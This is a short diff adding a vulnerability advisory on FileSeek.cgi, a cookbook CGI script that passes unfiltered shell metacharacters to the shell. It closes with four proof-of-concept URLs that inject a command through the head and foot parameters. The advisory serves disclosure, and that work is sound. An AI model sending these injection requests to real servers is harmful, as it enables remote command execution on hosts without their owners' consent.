@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/6783/info
+
+FileSeek is an example cgi-script from "The CGI/Perl Cookbook from John Wiley &
+Sons". The script is written and maintained by Craig Patchett. It is mainly used to find and download files on a web server.
+
+It has been reported that FileSeek.cgi and FileSeek2.cgi do not filter shell metacharacters from web requests. As a result, it is possible for a remote attacker to execute commands on the shell of a host running the vulnerable script. Commands will be executed with the privileges of the webserver process.
+
+This impact of this vulnerability is that an attacker may gain local, interactive access to the host.
+
+http://www.example.com/cgi-bin/FileSeek.cgi?head=&foot=;id|
+http://www.example.com/cgi-bin/FileSeek.cgi?head=;id|&foot=
+
+http://www.example.com/cgi-bin/FileSeek.cgi?head=&foot=|id|
+http://www.example.com/cgi-bin/FileSeek.cgi?head=|id|&foot=
